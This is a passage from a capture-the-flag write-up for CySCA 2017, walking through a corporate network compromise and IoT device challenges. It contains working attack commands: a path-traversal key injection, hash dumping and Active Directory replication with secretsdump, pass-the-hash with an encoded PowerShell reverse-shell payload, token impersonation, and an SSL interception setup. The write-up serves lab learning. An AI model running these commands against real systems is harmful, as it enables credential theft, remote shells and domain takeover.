csrfmiddlewaretoken=90ZBvy5hp7dzi4lBRixLbEeB0CEaol7j&newkey=ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABAQDIJXQyicPs2Hab0tpCDLHYso6nD9TrRfV2wCkJVEG/LpWInKjIapsxd7zRvciN00mO8ht9vaw8d%2bcsNXZMxbvwsIUWSOJJB1StANrsv3f7PW4BX9WUCxXNVn6D62XJvL5a84ObIPMWscfiz837vQX8QXH5Dv%2bWtxCUCuVTcHC2Cm4AD%2bSkNKFVd9Ef3ohIOA3PsiVWWFe3DLcVKeh0M3JoCulGUyRG8ufoU3D/XMZQIXWGIdxmPAZzVnu7YNJ%2bwOMYh3jtGcDMQou6BjS/KS3Fdtm3CL0FshtUhhmNy6nb7EI%2bqE/rz8ApSoXFMqOMPYPNdtbOH%2boSkV8pgERXGBzz+root%40kali&submit=ADD+Key
```

Having changed the linuxuser variable to ```../root```, our SSH public key gets added to root's ```authorized_keys``` file, and we are then able to SSH to root on the backup server!

First, we port forward the SSH port on the backup server so that we can access it from our kali machine, and then we SSH using the private key that pairs with the public key we added above:

```c
meterpreter > portfwd add -l 2222 -p 22 -r 10.10.5.104
```

```c {hl_lines=[1,4,6,8]}
root@kali:~# ssh root@127.0.0.1 -p 2222
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.
Last login: Tue Apr 11 11:49:14 2017
root@BackupServer:~# id
uid=0(root) gid=0(root) groups=0(root)
root@BackupServer:~# uname -a
Linux BackupServer 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/Linux
root@BackupServer:~# cat flag.txt
FLAG{HMUKYIH6DC453LHJGC96NZA9MWDV1967}
```

Challenge 5 complete!

## Challenge 6: 70's Chocolate
In this challenge, we are asked to compromise the DC server in the tictoc.cysca domain.

Looking around the backup server, we find a very interesting readme file in the ```/BACKUPS``` folder:

```c {hl_lines=[1]}
root@BackupServer:/BACKUPS# cat readme 
This folder contains the core file backups from the Domain Controllers.
This was setup in the event migration to a new Windows Server version Failed.
```

It looks like there are core Windows files stored in this Backups folder! We can use the following commands to copy the DC and BackupDC's SAM, SECURITY and SYSTEM files to our local kali machine:

```c
$ scp -P 2222 root@127.0.0.1:/BACKUPS/DC/SAM . 
$ scp -P 2222 root@127.0.0.1:/BACKUPS/DC/SECURITY .
$ scp -P 2222 root@127.0.0.1:/BACKUPS/DC/SYSTEM . 
$ scp -P 2222 root@127.0.0.1:/BACKUPS/BackupDC/SAM .
$ scp -P 2222 root@127.0.0.1:/BACKUPS/BackupDC/SECURITY .
$ scp -P 2222 root@127.0.0.1:/BACKUPS/BackupDC/SYSTEM .
```

With these files, there are many tools to extract credentials including passwords and hashes from them. My favourite is Impacket's ```secretsdump.py``` which can be used as follows:

```c {hl_lines=[1]}
root@kali:~/Documents/CySCA/corporate/70schocolate/BackupDC# secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies

[*] Target system bootKey: 0xc5c430dd324e865569b79dee6003caf2
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9102f2abb7087043adf5344b8566d072:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:0afd89a7c973d77553ff5b182db22554
```

We could try PTH or cracking the local SAM hashes, however the machine account credentials are very interesting! As we know these credentials came from a Backup DC server, it can be assumed that this Machine Account also has access to replicate Active Directory from the DC. Additionally, we know from previously running ```nslookup``` commands that the IP address of the DC is ```10.10.5.10```.

The blog post [here](https://room362.com/post/2015/using-domain-controller-account-passwords-to-hashdump-domains/) talks about how we can use the machine account credentials to replicate AD. Amazingly, the same tool we used before can be used for this, ```secretsdump.py```. However, we will need access to the SMB ports, 135 and 445, so that we can talk to the DC from our kali machine:

```c {hl_lines=[1,3]}
meterpreter > portfwd add -l 135 -p 135 -r 10.10.5.10
[*] Local TCP relay created: :135 <-> 10.10.5.10:135
meterpreter > portfwd add -l 445 -p 445 -r 10.10.5.10
[*] Local TCP relay created: :445 <-> 10.10.5.10:445
```

Next, we use ```secretsdump.py``` to replicate AD and download the hashes stored in it:

```c {hl_lines=[1]}
root@kali:~/Documents/CySCA/corporate/70schocolate/BackupDC# secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0afd89a7c973d77553ff5b182db22554 -just-dc-ntlm TICTOC/BackupDC\$@127.0.0.1
Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
tictoc.cysca\Administrator:500:aad3b435b51404eeaad3b435b51404ee:0bcbdad17128326964ff65849559b685:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3b3890aa39d90a4a249fb71b71b5ec66:::
```

I have cut out most of the output of this command as there were many, many more hashes in the output. The main one we care about, however, is the Administrator account for the tictoc.cysca domain.

As we still have our PowerShell Empire listener running, we can simply use metasploit's psexec_psh module to execute our Empire reverse shell payload:

```c
msf exploit(handler) > use exploit/windows/smb/psexec_psh
msf exploit(psexec_psh) > set SMBPASS aad3b435b51404eeaad3b435b51404ee:0bcbdad17128326964ff65849559b685
msf exploit(psexec_psh) > set SMBUSER Administrator
msf exploit(psexec_psh) > set SMBDomain tictoc.cysca
msf exploit(psexec_psh) > set RHOST 10.10.5.10
msf exploit(psexec_psh) > set payload windows/exec
msf exploit(psexec_psh) > set CMD powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwBUAGUAbQAuAE4ARQB0AC4AUwBlAFIAdgBJAGMARQBQAG8AaQBOAHQATQBBAG4AYQBHAEUAUgBdADoAOgBFAHgAUABFAEMAdAAxADAAMABDAG8ATgBUAEkAbgB1AEUAIAA9ACAAMAA7ACQAVwBDAD0ATgBlAFcALQBP...
msf exploit(psexec_psh) > exploit
```

And we receive a shell on PowerShell Empire! It should be noted however that for some reason we receive a shell as SYSTEM rather than as Administrator:

```c
(Empire: stager/launcher) > [+] Initial agent LTZHYN1FSPDX2FCL from 10.10.5.10 now active
(Empire: stager/launcher) > agents

[*] Active agents:

  Name               Internal IP     Machine Name    Username            Process             Delay    Last Seen
  ---------          -----------     ------------    ---------           -------             -----    --------------------
  LTZHYN1FSPDX2FCL   10.10.5.10      DC              *TICTOC\SYSTEM      powershell/8384     5/0.0    2017-04-20 21:56:28
  ```

As the flag for this challenge is only readable by Administrator, and not SYSTEM (the irony...), we have to impersonate the Administrator's token to read the flag. The way I did this was to first gain a meterpreter shell again, and then impersonate Administrator's token using a build in meterpreter command:

```c
(Empire: code_execution/invoke_metasploitpayload) > usemodule code_execution/invoke_shellcode
(Empire: code_execution/invoke_shellcode) > set Lport 8081
(Empire: code_execution/invoke_shellcode) > set Lhost 192.168.5.100
(Empire: code_execution/invoke_shellcode) > execute
```

```c {hl_lines=[1,8,10,12,31,34]}
msf exploit(handler) > exploit

[*] Started HTTPS reverse handler on https://192.168.5.100:8081
[*] Starting the payload handler...
[*] https://192.168.5.100:8081 handling request from 10.10.5.10; (UUID: mvqhismu) Staging x86 payload (958531 bytes) ...
[*] Meterpreter session 2 opened (192.168.5.100:8081 -> 10.10.5.10:28111) at 2017-04-20 22:43:44 +1000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > use incognito 
Loading extension incognito...success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
IIS APPPOOL\DefaultAppPool
NT AUTHORITY\IUSR
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
TICTOC\Administrator
Window Manager\DWM-1

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON
TICTOC\DC$
TICTOC\madisonw
TICTOC\WORKSTATION$

meterpreter > impersonate_token TICTOC\\Administrator
[+] Delegation token available
[+] Successfully impersonated user TICTOC\Administrator
meterpreter > getuid
Server username: TICTOC\Administrator
meterpreter > cd flag
meterpreter > cat flag.txt
FLAG{6SFK6EANGWWV70A163KIUEQJMLA51929}
```

We have successfully compromised the DC!

## Challenge 7: Alone in the wilderness

Unfortunately I did not get to complete this one, but it looked like a buffer overflow + ret2libc challenge binary, with the server running on 10.10.5.111, port 31337.

Let's move on to the very interesting IoT challenges!

---
# CySCA 2017 IoT Challenges

For these challenges, we are provided a physical ESP8266 microchip, with a Wi-fi module, a full TCP/IP stack and a microcontroller for executing code.

The ESP8266 microchip comes with a wi-fi module, so we can connect it to a wi-fi hotspot. Using a USB Wi-fi adapter I owned, I knew I could put my kali machine and the microchip on the same wi-fi network.

We connect the Wi-Fi usb adapter to the kali VM and set it up as hotspot (see [this video](https://www.youtube.com/watch?v=CojA2ZZPiKs) for a guide). Then, we start the IoT device and connect to the hotspot with the credentials that we setup when creating the hotspot.

## Challenge 1: Take a Peak

The first challenge was to dump the firmware from the device itself. This is quite simply with a tool called ```esptool.py```. We connect the IoT device via USB to our kali VM and dump the firmware as follows:

```c
root@kali:~/Documents/CySCA# esptool.py --port /dev/ttyUSB0 read_flash 0 0x9a000 read_flash_output_0x9a000.bin
```

This reads from the offset of ```0x9a000``` and outputs the flash contents to a file called ```read_flash_output_0x9a000.bin```. Note that I had to have the device disconnected from ```screen```, and press the reset button on the device while the above command was running.

## Challenge 2: Whoop Whoop Whoop

As we have the device connected to our Wi-fi hotspot, we can monitor the traffic that the device sends out using the adapter on the wi-fi network connected to our Kali VM.

Using Wireshark, we notice the following request coming from the IoT device:

```http
POST /data HTTP/1.0
Host: tempsensor.cysca
Content-Type: application/x-www-form-urlencoded
Content-Length: 227

signature=FF43530EBEE483CE41A60B49E8B94D5EF9ABE854&data=%7B%22HUMIDITY%22%3A+%2248.7%22%2C+%22TEMPERATURE%22%3A+%2222.9%22%2C+%22MAC%22%3A+%22A0%3A20%3AA6%3A14%3A30%3A35%22%2C+%22TIMESTAMP%22%3A+%222017-04-12+12%3A12%3A33%22%7D
```
```http
POST /data HTTP/1.0
Host: tempsensor.cysca
Content-Type: application/x-www-form-urlencoded
Content-Length: 227

signature=9A2CDEE1C5E12961A60D8D3024D54A6C8032C57C&data=%7B%22HUMIDITY%22%3A+%2248.9%22%2C+%22TEMPERATURE%22%3A+%2222.7%22%2C+%22MAC%22%3A+%22A0%3A20%3AA6%3A14%3A30%3A35%22%2C+%22TIMESTAMP%22%3A+%222017-04-12+12%3A12%3A44%22%7D
```

In the above requests, we can see the traffic going to ```tempsensor.cysca```, and we notice some interesting parameters named ```signature``` and ```data```.

With this challenge, we first used ```binwalk``` to extract MicroPython scripts from the firmware we extracted, and then we changed the script to send a really high temperature in the ```data``` field. The script included code to calculate the signature on the data automatically, and a request was sent to ```tempsensor.cysca``` with a high temperature reading. The following screenshot shows the results on the tempsensor.cysca web server which was used for reporting of temperatures.

The error at the top of the page reveals the flag when a high temperature reading is sent to the server.


## Challenge 3: In Certs we Trust

For the follwing challenges, we were provided with two extra pieces of firmware, one for a door lock and one for a door unlocker. We have to re-flash the IoT device with new firmware and analyse the differences between these two firmware.

First, we look at the door lock. Once re-flashed with the door unlocker firmware, we use ```esptool.py``` to dump the firmware again, and run it through ```binwalk```.

In the ```binwalk``` output, I found a ```.cer``` file, a ```.key``` file, and the following python script:

```py {hl_lines=[1]}
$ cat mqttpasswd.py
import uhashlib
import ubinascii

def genpw(mac,username):
    mac = mac.upper()
    username = username.upper()
    #N.O.T..A..F.L.A.G
    k = "faeQuaijeiFee8peet3Jeush9shieMiechee0aen"
    d = bytearray(k+mac+username+k)
    pw_hash = uhashlib.sha1(d)
    pw = ubinascii.hexlify(pw_hash.digest()).decode("utf-8").upper()
    return pw
```

Additionally, we found a ```Main.py``` file with the following two interesting lines inside:

```py
self.passwd = mqttpasswd.genpw(self.mac,self.username)
self.client = MQTTClient(self.mac, self.server, self.port, self.mac, self.passwd, 0, ssl=True)
```

From the above, we gather that the communications this door control firmware sends out is based on the MQTT protocol, and is encapsulated using SSL. Additionally, we find in the code that the device talks to ```doorctrl.cysca``` on port ```8883```.

Our task was to intercept the SSL traffic sent from the device so that we can see and/or modify the data. There are a couple of different ways in which we could achieve this MITM attack:
* ARP spoof both the server and the client so that they both communicate through us
* Intercept the DNS reply to tell the IoT device that we are the doorctrl web server
* Or edit our hosts file to send traffic destined for ```doorctrl.cysca``` to an intercepting proxy. This proxy would then relay the traffic to the real web server.
* Use iptables port forwarding to send traffic to our proxy

Let's try the last option. We flush the iptables rules we currently have, and then use a PREROUTING rule to forward all traffic destined for the doorctrl web server to our local IP address on the wi-fi network:

```c
$ iptables -t nat -F
$ iptables -t nat -A PREROUTING -d 10.13.37.150 -p tcp --dport 8883 -j DNAT --to-destination 192.168.5.100
```

Additionally, to intercept SSL traffic, we need to first create our own self-signed certificate with a private key so that we can present it to the IoT device and pretend to be the real server. We create these files as follows:

```c
$ openssl genrsa -out ca.key 4096
$ openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
```

Now we can use sslsplit with the generated certificate and private above to man-in-the-middle traffic between the IoT device and the web server:

```c
$ sslsplit -D -l connections.log -j /root/Documents/CySCA/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 192.168.5.100 8883 10.13.37.150 8883
```

Once traffic is sent from the device to our sslsplit instance, we get the flag: ```FLAG{HQVYBHPSG4BA499ZFCUH4E6414J41887}```


## Challenge 4: Sanitize All Inputs

Unfortunately I did not get to complete challenge 4 and 5 of the IoT challenges, but here is a summary of the tasks involved in these challenges:
1. Use python to create my own SSL interception and modification proxy. Example code for this can be found [here](https://stackoverflow.com/questions/38647601/how-to-create-a-proxy-that-can-decode-ssl-traffic).
2. Intercept requests made to the web server, and find an SQL injection vulnerability using the data sent in the MQTT protocol.
3. Use the SQL injection to dump the database

Challenge 5 involved using the SQL injection to unlock another person's door lock using their MAC address and my door unlocker IoT device.

And those were the challenges I found the most interesting in CySCA 2017! Again, thank you to the challenge writers for providing this amazing learning experience!


---
Live and Learn!

CySCA 2017 in a box: https://www.cyberchallenge.com.au/2017/inabox/index.html

CySCA 2017 IoT in a box: https://www.cyberchallenge.com.au/2017/iot_inabox/index.html